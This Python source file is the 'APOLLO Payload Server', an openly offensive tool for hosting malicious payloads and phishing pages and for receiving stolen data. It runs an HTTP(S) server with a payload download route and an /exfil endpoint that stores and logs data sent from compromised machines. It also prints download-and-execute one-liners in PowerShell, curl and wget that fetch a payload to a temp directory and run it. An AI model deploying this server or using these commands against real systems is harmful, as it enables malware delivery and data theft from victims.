#!/usr/bin/env python3
"""
APOLLO Payload Server - Lightweight HTTP server for payload delivery,
phishing hosting, and data exfiltration receiving.
"""
import sys, os, json, threading, http.server, socketserver, urllib.parse, time, hashlib, hmac, ssl, subprocess
from datetime import datetime
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from kb_manager import *

CONFIG_FILE = os.path.expanduser("~/.config/opencode/apollo-engine/.payload_server.json")
UPLOAD_DIR = os.path.expanduser("~/.config/opencode/apollo-engine/payloads/")
EXFIL_DIR = os.path.expanduser("~/.config/opencode/apollo-engine/exfil_data/")
CERT_DIR = os.path.expanduser("~/.config/opencode/apollo-engine/certs/")

DEFAULT_CONFIG = {
    "host": "0.0.0.0",
    "port": 8080,
    "payload_dir": UPLOAD_DIR,
    "exfil_dir": EXFIL_DIR,
    "auth_token": "",
    "serve_index": True,
}

class PayloadHTTPHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        self.server_config = kwargs.pop("config", DEFAULT_CONFIG)
        super().__init__(*args, **kwargs)

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path

        if path == "/":
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self._list_payloads()
            return

        if path.startswith("/payload/"):
            filename = path[len("/payload/"):]
            payload_base = os.path.normpath(self.server_config.get("payload_dir", UPLOAD_DIR))
            safe_path = os.path.normpath(os.path.join(payload_base, filename))
            if not safe_path.startswith(payload_base) or ".." in filename or filename.startswith("/"):
                self.send_error(403)
                return
            if os.path.exists(safe_path):
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Disposition", f'attachment; filename="{filename}"')
                self.end_headers()
                with open(safe_path, "rb") as f:
                    self.wfile.write(f.read())
                self._log_delivery(filename)
                return
            self.send_error(404)
            return

        if path.startswith("/exfil/"):
            token = parsed.query.split("=")[1] if "token=" in parsed.query else ""
            if self.server_config.get("auth_token") and token != self.server_config["auth_token"]:
                self.send_error(403)
                return
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"APOLLO exfil endpoint ready")
            return

        self.send_error(404)

    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path

        if path == "/exfil":
            token = parsed.query.split("=")[1] if "token=" in parsed.query else ""
            if self.server_config.get("auth_token") and token != self.server_config["auth_token"]:
                self.send_error(403)
                return
            content_length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_length)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            client = self.client_address[0]
            filename = f"exfil_{client}_{timestamp}.bin"
            os.makedirs(self.server_config.get("exfil_dir", EXFIL_DIR), exist_ok=True)
            filepath = os.path.join(self.server_config.get("exfil_dir", EXFIL_DIR), filename)
            with open(filepath, "wb") as f:
                f.write(body)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            response = json.dumps({"status": "ok", "file": filename, "size": len(body)})
            self.wfile.write(response.encode())
            self._log_exfil(client, filename, len(body))
            return

        if path.startswith("/payload/upload"):
            token = parsed.query.split("=")[1] if "token=" in parsed.query else ""
            if self.server_config.get("auth_token") and token != self.server_config["auth_token"]:
                self.send_error(403)
                return
            content_length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_length)
            disp = self.headers.get("Content-Disposition", "")
            filename = "uploaded.bin"
            if "filename=" in disp:
                raw_name = disp.split("filename=")[-1].strip(' "')
                filename = os.path.basename(raw_name) if raw_name else "uploaded.bin"
            payload_base = os.path.normpath(self.server_config.get("payload_dir", UPLOAD_DIR))
            os.makedirs(payload_base, exist_ok=True)
            filepath = os.path.join(payload_base, filename)
            if not filepath.startswith(payload_base):
                self.send_error(403)
                return
            with open(filepath, "wb") as f:
                f.write(body)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            response = json.dumps({"status": "ok", "file": filename, "size": len(body)})
            self.wfile.write(response.encode())
            return

        self.send_error(404)

    def _list_payloads(self):
        payload_dir = self.server_config.get("payload_dir", UPLOAD_DIR)
        self.wfile.write(b"<html><head><title>APOLLO Payload Server</title></head><body>")
        self.wfile.write(b"<h1>APOLLO Payload Delivery Server</h1>")
        self.wfile.write(b"<h2>Available Payloads</h2><ul>")
        if os.path.exists(payload_dir):
            for f in sorted(os.listdir(payload_dir)):
                fpath = os.path.join(payload_dir, f)
                if os.path.isfile(fpath):
                    size = os.path.getsize(fpath)
                    self.wfile.write(f'<li><a href="/payload/{f}">{f}</a> ({size:,} bytes)</li>'.encode())
        self.wfile.write(b"</ul>")
        self.wfile.write(b"<h2>Exfil Endpoint</h2>")
        self.wfile.write(b'<p>POST /exfil - Send exfiltrated data</p>')
        self.wfile.write(b"<p>GET /exfil - Check endpoint</p>")
        self.wfile.write(b"</body></html>")

    def _log_delivery(self, filename):
        pid = get_project_id()
        create_event(pid, "payload_delivery", "payload_server",
                    f"Payload delivered: {filename} to {self.client_address[0]}",
                    {"filename": filename, "client": self.client_address[0]}, "high")

    def _log_exfil(self, client, filename, size):
        pid = get_project_id()
        create_event(pid, "exfil_received", "payload_server",
                    f"Exfil data received: {filename} from {client} ({size} bytes)",
                    {"filename": filename, "client": client, "size": size}, "critical")
        add_note(pid, f"Exfiltrated data: {filename}",
                f"Received {size} bytes from {client} on {datetime.now()}")

    def log_message(self, format, *args):
        sys.stderr.write(f"[APOLLO] {datetime.now().strftime('%H:%M:%S')} {args[0]} {args[1]} {args[2]}\n")

def _ensure_self_signed_cert():
    """Generate a self-signed SSL certificate if none exists."""
    cert_file = os.path.join(CERT_DIR, "cert.pem")
    key_file = os.path.join(CERT_DIR, "key.pem")
    if os.path.exists(cert_file) and os.path.exists(key_file):
        return cert_file, key_file
    os.makedirs(CERT_DIR, exist_ok=True)
    try:
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        import datetime
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        subject = issuer = x509.Name([x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                                      x509.NameAttribute(NameOID.COMMON_NAME, "APOLLO")])
        cert = (x509.CertificateBuilder().subject_name(subject).issuer_name(issuer)
                .public_key(key.public_key()).serial_number(x509.random_serial_number())
                .not_valid_before(datetime.datetime.utcnow())
                .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
                .add_extension(x509.SubjectAlternativeName([x509.DNSName("localhost")]), critical=False)
                .sign(key, hashes.SHA256()))
        with open(key_file, "wb") as f: f.write(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()))
        with open(cert_file, "wb") as f: f.write(cert.public_bytes(serialization.Encoding.PEM))
    except ImportError:
        subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-keyout", key_file,
                        "-out", cert_file, "-days", "365", "-nodes",
                        "-subj", "/C=US/O=APOLLO/CN=localhost"], capture_output=True)
    return cert_file, key_file

class PayloadServer:
    def __init__(self, host="0.0.0.0", port=8080, use_https=False):
        self.host = host
        self.port = port
        self.use_https = use_https
        self.server = None
        self.thread = None

    def start(self, daemon=False):
        os.makedirs(UPLOAD_DIR, exist_ok=True)
        os.makedirs(EXFIL_DIR, exist_ok=True)
        handler = lambda *args: PayloadHTTPHandler(*args, config={
            "payload_dir": UPLOAD_DIR,
            "exfil_dir": EXFIL_DIR,
        })
        self.server = socketserver.TCPServer((self.host, self.port), handler)
        if self.use_https:
            cert_file, key_file = _ensure_self_signed_cert()
            self.server.socket = ssl.wrap_socket(self.server.socket,
                                                  certfile=cert_file,
                                                  keyfile=key_file,
                                                  server_side=True)
        self.thread = threading.Thread(target=self.server.serve_forever)
        self.thread.daemon = daemon
        self.thread.start()
        proto = "https" if self.use_https else "http"
        return f"Payload server running on {proto}://{self.host}:{self.port}"

    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()

def add_payload(filepath):
    """Copy a file into the payload directory."""
    import shutil
    os.makedirs(UPLOAD_DIR, exist_ok=True)
    if not os.path.exists(filepath):
        return {"error": "File not found"}
    dest = os.path.join(UPLOAD_DIR, os.path.basename(filepath))
    shutil.copy2(filepath, dest)
    return {"status": "ok", "file": os.path.basename(filepath), "size": os.path.getsize(dest)}

def list_payloads():
    os.makedirs(UPLOAD_DIR, exist_ok=True)
    payloads = []
    for f in sorted(os.listdir(UPLOAD_DIR)):
        fpath = os.path.join(UPLOAD_DIR, f)
        if os.path.isfile(fpath):
            payloads.append({"name": f, "size": os.path.getsize(fpath), "path": fpath})
    return payloads

def generate_powershell_download(url):
    """Generate PowerShell one-liner to download payload."""
    return f'powershell -c "Invoke-WebRequest -Uri {url} -OutFile $env:TEMP\\payload.exe; Start-Process $env:TEMP\\payload.exe"'

def generate_curl_download(url):
    return f"curl -s {url} -o /tmp/payload && chmod +x /tmp/payload && /tmp/payload"

def generate_wget_download(url):
    return f"wget -q {url} -O /tmp/payload && chmod +x /tmp/payload && /tmp/payload"

if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "start":
            port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
            use_https = "--https" in sys.argv
            server = PayloadServer(port=port, use_https=use_https)
            print(server.start(daemon=False))
        elif sys.argv[1] == "add" and len(sys.argv) > 2:
            result = add_payload(sys.argv[2])
            print(json.dumps(result, indent=2))
        elif sys.argv[1] == "list":
            print(json.dumps(list_payloads(), indent=2))
        elif sys.argv[1] == "gen" and len(sys.argv) > 2:
            url = sys.argv[2]
            print("PowerShell:")
            print(generate_powershell_download(url))
            print("\nCurl:")
            print(generate_curl_download(url))
            print("\nWget:")
            print(generate_wget_download(url))
        else:
            print("Usage:")
            print("  payload_server.py start [port]     - Start HTTP server")
            print("  payload_server.py add <file>        - Add payload")
            print("  payload_server.py list              - List payloads")
            print("  payload_server.py gen <url>         - Generate download commands")
